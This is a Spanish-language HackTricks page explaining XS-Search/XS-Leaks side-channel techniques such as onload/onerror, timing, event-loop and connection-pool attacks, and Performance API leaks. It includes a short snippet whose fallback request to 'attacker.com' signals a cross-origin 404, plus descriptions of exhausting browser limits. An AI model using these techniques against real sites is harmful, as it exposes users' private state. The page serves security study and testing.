# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente, impulsados por las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

## Informaci√≥n B√°sica

XS-Search es un m√©todo utilizado para **extraer informaci√≥n de origen cruzado** aprovechando **vulnerabilidades de canal lateral**.

Los componentes clave involucrados en este ataque incluyen:

* **Web Vulnerable**: El sitio web objetivo del cual se pretende extraer informaci√≥n.
* **Web del Atacante**: El sitio web malicioso creado por el atacante, que la v√≠ctima visita, alojando el exploit.
* **M√©todo de Inclusi√≥n**: La t√©cnica empleada para incorporar la Web Vulnerable en la Web del Atacante (por ejemplo, window.open, iframe, fetch, etiqueta HTML con href, etc.).
* **T√©cnica de Filtraci√≥n**: T√©cnicas utilizadas para discernir diferencias en el estado de la Web Vulnerable basadas en la informaci√≥n recopilada a trav√©s del m√©todo de inclusi√≥n.
* **Estados**: Las dos condiciones potenciales de la Web Vulnerable, que el atacante busca distinguir.
* **Diferencias Detectables**: Variaciones observables de las que el atacante se basa para inferir el estado de la Web Vulnerable.

### Diferencias Detectables

Varios aspectos pueden ser analizados para diferenciar los estados de la Web Vulnerable:

* **C√≥digo de Estado**: Distinguir entre **varios c√≥digos de estado de respuesta HTTP** de origen cruzado, como errores de servidor, errores de cliente o errores de autenticaci√≥n.
* **Uso de API**: Identificar el **uso de APIs Web** a trav√©s de p√°ginas, revelando si una p√°gina de origen cruzado emplea una API Web de JavaScript espec√≠fica.
* **Redirecciones**: Detectar navegaciones a diferentes p√°ginas, no solo redirecciones HTTP, sino tambi√©n aquellas provocadas por JavaScript o HTML.
* **Contenido de la P√°gina**: Observar **variaciones en el cuerpo de respuesta HTTP** o en sub-recursos de la p√°gina, como el **n√∫mero de marcos incrustados** o disparidades en el tama√±o de las im√°genes.
* **Encabezado HTTP**: Notar la presencia o posiblemente el valor de un **encabezado de respuesta HTTP espec√≠fico**, incluyendo encabezados como X-Frame-Options, Content-Disposition y Cross-Origin-Resource-Policy.
* **Temporizaci√≥n**: Notar disparidades de tiempo consistentes entre los dos estados.

### M√©todos de Inclusi√≥n

* **Elementos HTML**: HTML ofrece varios elementos para **inclusi√≥n de recursos de origen cruzado**, como hojas de estilo, im√°genes o scripts, obligando al navegador a solicitar un recurso no HTML. Se puede encontrar una compilaci√≥n de elementos HTML potenciales para este prop√≥sito en [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Marcos**: Elementos como **iframe**, **object** y **embed** pueden incrustar recursos HTML directamente en la p√°gina del atacante. Si la p√°gina **no tiene protecci√≥n contra marcos**, JavaScript puede acceder al objeto de ventana del recurso enmarcado a trav√©s de la propiedad contentWindow.
* **Ventanas emergentes**: El m√©todo **`window.open`** abre un recurso en una nueva pesta√±a o ventana, proporcionando un **manejador de ventana** para que JavaScript interact√∫e con m√©todos y propiedades siguiendo el SOP. Las ventanas emergentes, a menudo utilizadas en el inicio de sesi√≥n √∫nico, eluden las restricciones de enmarcado y cookies de un recurso objetivo. Sin embargo, los navegadores modernos restringen la creaci√≥n de ventanas emergentes a ciertas acciones del usuario.
* **Solicitudes de JavaScript**: JavaScript permite solicitudes directas a recursos objetivo utilizando **XMLHttpRequests** o la **Fetch API**. Estos m√©todos ofrecen un control preciso sobre la solicitud, como optar por seguir redirecciones HTTP.

### T√©cnicas de Filtraci√≥n

* **Manejador de Eventos**: Una t√©cnica cl√°sica de filtraci√≥n en XS-Leaks, donde manejadores de eventos como **onload** y **onerror** proporcionan informaci√≥n sobre el √©xito o fracaso de la carga de recursos.
* **Mensajes de Error**: Excepciones de JavaScript o p√°ginas de error especiales pueden proporcionar informaci√≥n de filtraci√≥n ya sea directamente del mensaje de error o diferenciando entre su presencia y ausencia.
* **L√≠mites Globales**: Limitaciones f√≠sicas de un navegador, como la capacidad de memoria u otros l√≠mites impuestos por el navegador, pueden se√±alar cuando se alcanza un umbral, sirviendo como t√©cnica de filtraci√≥n.
* **Estado Global**: Interacciones detectables con los **estados globales** de los navegadores (por ejemplo, la interfaz de Historia) pueden ser explotadas. Por ejemplo, el **n√∫mero de entradas** en el historial de un navegador puede ofrecer pistas sobre p√°ginas de origen cruzado.
* **API de Rendimiento**: Esta API proporciona **detalles de rendimiento de la p√°gina actual**, incluyendo el tiempo de red para el documento y recursos cargados, permitiendo inferencias sobre los recursos solicitados.
* **Atributos Legibles**: Algunos atributos HTML son **legibles de origen cruzado** y pueden ser utilizados como t√©cnica de filtraci√≥n. Por ejemplo, la propiedad `window.frame.length` permite a JavaScript contar los marcos incluidos en una p√°gina web de origen cruzado.

## Herramienta XSinator y Documento

XSinator es una herramienta autom√°tica para **verificar navegadores contra varios XS-Leaks conocidos** explicados en su documento: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Puedes **acceder a la herramienta en** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks Excluidos**: Tuvimos que excluir XS-Leaks que dependen de **service workers** ya que interferir√≠an con otras filtraciones en XSinator. Adem√°s, elegimos **excluir XS-Leaks que dependen de configuraciones incorrectas y errores en una aplicaci√≥n web espec√≠fica**. Por ejemplo, configuraciones incorrectas de CrossOrigin Resource Sharing (CORS), filtraciones de postMessage o Cross-Site Scripting. Adicionalmente, excluimos XS-Leaks basados en tiempo ya que a menudo sufren de ser lentos, ruidosos e inexactos.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente, impulsados por las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **T√©cnicas Basadas en Tiempo**

Algunas de las siguientes t√©cnicas van a usar el tiempo como parte del proceso para detectar diferencias en los posibles estados de las p√°ginas web. Hay diferentes formas de medir el tiempo en un navegador web.

**Relojes**: La API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite a los desarrolladores obtener mediciones de tiempo de alta resoluci√≥n.\
Hay un n√∫mero considerable de APIs que los atacantes pueden abusar para crear relojes impl√≠citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animaciones CSS, y otros.\
Para m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## T√©cnicas de Manejador de Eventos

### Onload/Onerror

* **M√©todos de Inclusi√≥n**: Marcos, Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumen**: si se intenta cargar un recurso, se activan eventos onerror/onload cuando el recurso se carga con √©xito/sin √©xito, es posible averiguar el c√≥digo de estado.
* **Ejemplo de c√≥digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

El ejemplo de c√≥digo intenta **cargar objetos de scripts desde JS**, pero **otras etiquetas** como objetos, hojas de estilo, im√°genes, audios tambi√©n podr√≠an ser utilizadas. Adem√°s, tambi√©n es posible inyectar la **etiqueta directamente** y declarar los eventos `onload` y `onerror` dentro de la etiqueta (en lugar de inyectarlo desde JS).

Tambi√©n hay una versi√≥n sin script de este ataque:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
En este caso, si `example.com/404` no se encuentra, se cargar√° `attacker.com/?error`.

### Onload Timing

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Tiempo (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumen:** La [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** se puede utilizar para medir cu√°nto tiempo tarda en realizarse una solicitud. Sin embargo, se podr√≠an utilizar otros relojes, como el [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) que puede identificar tareas que se ejecutan durante m√°s de 50 ms.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) otro ejemplo en:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Esta t√©cnica es similar a la anterior, pero el **atacante** tambi√©n **forzar√°** alguna acci√≥n para que tome una **cantidad relevante de tiempo** cuando la **respuesta sea positiva o negativa** y medir√° ese tiempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Tiempo (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumen:** El reloj [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) se puede utilizar para medir cu√°nto tiempo tarda en realizarse una solicitud. Se podr√≠an utilizar otros relojes.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

El tiempo que se tarda en obtener un recurso se puede medir utilizando los eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) y [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). El evento **`beforeunload`** se activa cuando el navegador est√° a punto de navegar a una nueva p√°gina, mientras que el evento **`unload`** ocurre cuando la navegaci√≥n est√° realmente teniendo lugar. La diferencia de tiempo entre estos dos eventos se puede calcular para determinar la **duraci√≥n que el navegador pas√≥ obteniendo el recurso**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Tiempo (generalmente debido al Contenido de la P√°gina, C√≥digo de Estado)
* **M√°s info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumen:** La [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API se puede utilizar para medir cu√°nto tiempo tarda en realizarse una solicitud. Se podr√≠an utilizar otros relojes.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Se ha observado que, en ausencia de [Protecciones de Enmarcado](https://xsleaks.dev/docs/defenses/opt-in/xfo/), el tiempo requerido para que una p√°gina y sus subrecursos se carguen a trav√©s de la red puede ser medido por un atacante. Esta medici√≥n es t√≠picamente posible porque el controlador `onload` de un iframe se activa solo despu√©s de la finalizaci√≥n de la carga de recursos y la ejecuci√≥n de JavaScript. Para eludir la variabilidad introducida por la ejecuci√≥n de scripts, un atacante podr√≠a emplear el atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dentro del `<iframe>`. La inclusi√≥n de este atributo restringe numerosas funcionalidades, notablemente la ejecuci√≥n de JavaScript, facilitando as√≠ una medici√≥n que est√° predominantemente influenciada por el rendimiento de la red.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenido de la p√°gina
* **More info**:
* **Summary**: Si puedes hacer que la p√°gina d√© un error cuando se accede al contenido correcto y hacer que se cargue correctamente cuando se accede a cualquier contenido, entonces puedes hacer un bucle para extraer toda la informaci√≥n sin medir el tiempo.
* **Code Example**:

Supongamos que puedes **insertar** la **p√°gina** que tiene el **contenido secreto** **dentro de un Iframe**.

Puedes **hacer que la v√≠ctima busque** el archivo que contiene "_**flag**_" usando un **Iframe** (explotando un CSRF, por ejemplo). Dentro del Iframe sabes que el _**evento onload**_ se **ejecutar√° siempre al menos una vez**. Luego, puedes **cambiar** la **URL** del **iframe** pero cambiando solo el **contenido** del **hash** dentro de la URL.

Por ejemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la primera URL se **carg√≥ correctamente**, entonces, al **cambiar** la parte del **hash** de la URL, el **evento onload** **no se activar√°** de nuevo. Pero **si** la p√°gina tuvo alg√∫n tipo de **error** al **cargar**, entonces, el **evento onload** se **activar√° de nuevo**.

Entonces, puedes **distinguir entre** una p√°gina **cargada correctamente** o una p√°gina que tiene un **error** cuando se accede.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenido de la p√°gina
* **More info**:
* **Summary:** Si la **p√°gina** est√° **devolviendo** el contenido **sensible**, **o** un **contenido** que puede ser **controlado** por el usuario. El usuario podr√≠a establecer **c√≥digo JS v√°lido en el caso negativo**, un **cargar** cada intento dentro de **`<script>`** etiquetas, as√≠ que en **casos negativos** el **c√≥digo** de los atacantes se **ejecuta**, y en **casos afirmativos** **nada** se ejecutar√°.
* **Code Example:**

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: C√≥digo de estado y encabezados
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** es una medida de seguridad que impide que las p√°ginas web carguen ciertos recursos sensibles de origen cruzado para protegerse contra ataques como **Spectre**. Sin embargo, los atacantes pueden explotar su comportamiento protector. Cuando una respuesta sujeta a **CORB** devuelve un `Content-Type` _**protegido por CORB**_ con `nosniff` y un c√≥digo de estado `2xx`, **CORB** elimina el cuerpo y los encabezados de la respuesta. Los atacantes que observan esto pueden inferir la combinaci√≥n del **c√≥digo de estado** (que indica √©xito o error) y el `Content-Type` (que denota si est√° protegido por **CORB**), lo que lleva a una posible fuga de informaci√≥n.
* **Code Example**:

Consulta el enlace de m√°s informaci√≥n para obtener m√°s informaci√≥n sobre el ataque.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenido de la p√°gina
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Filtrar datos sensibles del atributo id o nombre.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es posible **cargar una p√°gina** dentro de un **iframe** y usar el **`#id_value`** para hacer que la p√°gina **se enfoque en el elemento** del iframe con el id indicado, luego si se activa una se√±al de **`onblur`**, el elemento ID existe.\
Puedes realizar el mismo ataque con etiquetas **`portal`**.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Uso de API
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Reunir informaci√≥n sensible de un postMessage o usar la presencia de postMessages como un or√°culo para conocer el estado del usuario en la p√°gina
* **Code Example**: `Cualquier c√≥digo que escuche todos los postMessages.`

Las aplicaciones utilizan frecuentemente [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para comunicarse entre diferentes or√≠genes. Sin embargo, este m√©todo puede exponer inadvertidamente **informaci√≥n sensible** si el par√°metro `targetOrigin` no se especifica correctamente, permitiendo que cualquier ventana reciba los mensajes. Adem√°s, el mero acto de recibir un mensaje puede actuar como un **or√°culo**; por ejemplo, ciertos mensajes pueden enviarse solo a usuarios que han iniciado sesi√≥n. Por lo tanto, la presencia o ausencia de estos mensajes puede revelar informaci√≥n sobre el estado o la identidad del usuario, como si est√°n autenticados o no.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** impulsados por las herramientas de la comunidad **m√°s avanzadas** del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Uso de API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Agotar el l√≠mite de conexi√≥n de WebSocket filtra el n√∫mero de conexiones de WebSocket de una p√°gina de origen cruzado.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Es posible identificar si, y cu√°ntas, **conexiones de WebSocket utiliza una p√°gina objetivo**. Esto permite a un atacante detectar estados de aplicaci√≥n y filtrar informaci√≥n relacionada con el n√∫mero de conexiones de WebSocket.

Si un **origen** utiliza la **m√°xima cantidad de objetos de conexi√≥n de WebSocket**, independientemente de su estado de conexi√≥n, la creaci√≥n de **nuevos objetos resultar√° en excepciones de JavaScript**. Para ejecutar este ataque, el sitio web atacante abre el sitio web objetivo en un pop-up o iframe y luego, despu√©s de que se haya cargado la web objetivo, intenta crear el m√°ximo n√∫mero de conexiones de WebSocket posible. El **n√∫mero de excepciones lanzadas** es el **n√∫mero de conexiones de WebSocket utilizadas por la ventana del sitio web objetivo**.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Uso de API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Detectar la solicitud de pago porque solo una puede estar activa a la vez.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Esta fuga XS permite a un atacante **detectar cu√°ndo una p√°gina de origen cruzado inicia una solicitud de pago**.

Debido a que **solo una solicitud de pago puede estar activa** al mismo tiempo, si el sitio web objetivo est√° utilizando la API de Solicitud de Pago, cualquier intento adicional de mostrar esta API fallar√° y causar√° una **excepci√≥n de JavaScript**. El atacante puede explotar esto **intentando mostrar peri√≥dicamente la interfaz de usuario de la API de Pago**. Si un intento causa una excepci√≥n, el sitio web objetivo la est√° utilizando actualmente. El atacante puede ocultar estos intentos peri√≥dicos cerrando inmediatamente la interfaz de usuario despu√©s de su creaci√≥n.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Medir el tiempo de ejecuci√≥n de una web abusando del bucle de eventos JS de un solo hilo.
* **Code Example**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript opera en un modelo de concurrencia de [bucle de eventos de un solo hilo](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), lo que significa que **solo puede ejecutar una tarea a la vez**. Esta caracter√≠stica puede ser explotada para medir **cu√°nto tiempo tarda en ejecutarse el c√≥digo de un origen diferente**. Un atacante puede medir el tiempo de ejecuci√≥n de su propio c√≥digo en el bucle de eventos despachando continuamente eventos con propiedades fijas. Estos eventos se procesar√°n cuando el grupo de eventos est√© vac√≠o. Si otros or√≠genes tambi√©n est√°n despachando eventos al mismo grupo, un **atacante puede inferir el tiempo que tardan en ejecutarse estos eventos externos al observar retrasos en la ejecuci√≥n de sus propias tareas**. Este m√©todo de monitoreo del bucle de eventos para retrasos puede revelar el tiempo de ejecuci√≥n del c√≥digo de diferentes or√≠genes, exponiendo potencialmente informaci√≥n sensible.

{% hint style="warning" %}
En un tiempo de ejecuci√≥n es posible **eliminar** **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Un m√©todo para medir el tiempo de ejecuci√≥n de una operaci√≥n web implica bloquear intencionalmente el bucle de eventos de un hilo y luego medir **cu√°nto tiempo tarda el bucle de eventos en estar disponible nuevamente**. Al insertar una operaci√≥n bloqueante (como un c√°lculo largo o una llamada a una API sincr√≥nica) en el bucle de eventos y monitorear el tiempo que tarda en comenzar la ejecuci√≥n del c√≥digo subsiguiente, se puede inferir la duraci√≥n de las tareas que se estaban ejecutando en el bucle de eventos durante el per√≠odo de bloqueo. Esta t√©cnica aprovecha la naturaleza de un solo hilo del bucle de eventos de JavaScript, donde las tareas se ejecutan secuencialmente, y puede proporcionar informaci√≥n sobre el rendimiento o el comportamiento de otras operaciones que comparten el mismo hilo.
* **Code Example**:

Una ventaja significativa de la t√©cnica de medir el tiempo de ejecuci√≥n bloqueando el bucle de eventos es su potencial para eludir **Site Isolation**. **Site Isolation** es una caracter√≠stica de seguridad que separa diferentes sitios web en procesos separados, con el objetivo de evitar que sitios maliciosos accedan directamente a datos sensibles de otros sitios. Sin embargo, al influir en el tiempo de ejecuci√≥n de otro origen a trav√©s del bucle de eventos compartido, un atacante puede extraer indirectamente informaci√≥n sobre las actividades de ese origen. Este m√©todo no depende del acceso directo a los datos de otro origen, sino que observa el impacto de las actividades de ese origen en el bucle de eventos compartido, eludiendo as√≠ las barreras de protecci√≥n establecidas por **Site Isolation**.

{% hint style="warning" %}
En un tiempo de ejecuci√≥n es posible **eliminar** **factores de red** para obtener **mediciones m√°s precisas**. Por ejemplo, cargando los recursos utilizados por la p√°gina antes de cargarla.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: Solicitudes de JavaScript
* **Detectable Difference**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Un atacante podr√≠a bloquear todos los sockets excepto 1, cargar la web objetivo y al mismo tiempo cargar otra p√°gina, el tiempo hasta que la √∫ltima p√°gina comience a cargar es el tiempo que la p√°gina objetivo tard√≥ en cargar.
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Los navegadores utilizan sockets para la comunicaci√≥n con el servidor, pero debido a los recursos limitados del sistema operativo y hardware, **los navegadores se ven obligados a imponer un l√≠mite** en el n√∫mero de sockets concurrentes. Los atacantes pueden explotar esta limitaci√≥n a trav√©s de los siguientes pasos:

1. Determinar el l√≠mite de sockets del navegador, por ejemplo, 256 sockets globales.
2. Ocupando 255 sockets durante un per√≠odo prolongado iniciando 255 solicitudes a varios hosts, dise√±adas para mantener las conexiones abiertas sin completarse.
3. Utilizar el socket 256 para enviar una solicitud a la p√°gina objetivo.
4. Intentar una solicitud 257 a un host diferente. Dado que todos los sockets est√°n en uso (seg√∫n los pasos 2 y 3), esta solicitud se encolar√° hasta que un socket est√© disponible. La demora antes de que esta solicitud proceda proporciona al atacante informaci√≥n de tiempo sobre la actividad de red relacionada con el socket 256 (el socket de la p√°gina objetivo). Esta inferencia es posible porque los 255 sockets del paso 2 a√∫n est√°n ocupados, lo que implica que cualquier socket que se vuelva disponible debe ser el que se liber√≥ del paso 3. El tiempo que tarda el socket 256 en estar disponible est√°, por lo tanto, directamente relacionado con el tiempo que se requiere para que la solicitud a la p√°gina objetivo se complete.

Para m√°s informaci√≥n: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: Solicitudes de JavaScript
* **Detectable Difference**: Tiempo (generalmente debido al contenido de la p√°gina, c√≥digo de estado)
* **More info**:
* **Summary:** Es como la t√©cnica anterior, pero en lugar de usar todos los sockets, **Google Chrome** pone un l√≠mite de **6 solicitudes concurrentes al mismo origen**. Si **bloqueamos 5** y luego **lanzamos una 6ta** solicitud, podemos **medir** el tiempo y si logramos hacer que la **p√°gina v√≠ctima env√≠e** m√°s **solicitudes** al mismo endpoint para detectar un **estado** de la **p√°gina**, la **6ta solicitud** tomar√° **m√°s tiempo** y podemos detectarlo.

## Performance API Techniques

La [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) ofrece informaci√≥n sobre las m√©tricas de rendimiento de las aplicaciones web, enriquecida a√∫n m√°s por la [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). La Resource Timing API permite monitorear los tiempos de las solicitudes de red detalladamente, como la duraci√≥n de las solicitudes. Notablemente, cuando los servidores incluyen el encabezado `Timing-Allow-Origin: *` en sus respuestas, se vuelve disponible informaci√≥n adicional como el tama√±o de transferencia y el tiempo de b√∫squeda de dominio.

Esta abundancia de datos se puede recuperar a trav√©s de m√©todos como [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) o [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), proporcionando una vista completa de la informaci√≥n relacionada con el rendimiento. Adem√°s, la API facilita la medici√≥n de tiempos de ejecuci√≥n al calcular la diferencia entre las marcas de tiempo obtenidas de [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Sin embargo, vale la pena se√±alar que para ciertas operaciones en navegadores como Chrome, la precisi√≥n de `performance.now()` puede estar limitada a milisegundos, lo que podr√≠a afectar la granularidad de las mediciones de tiempo.

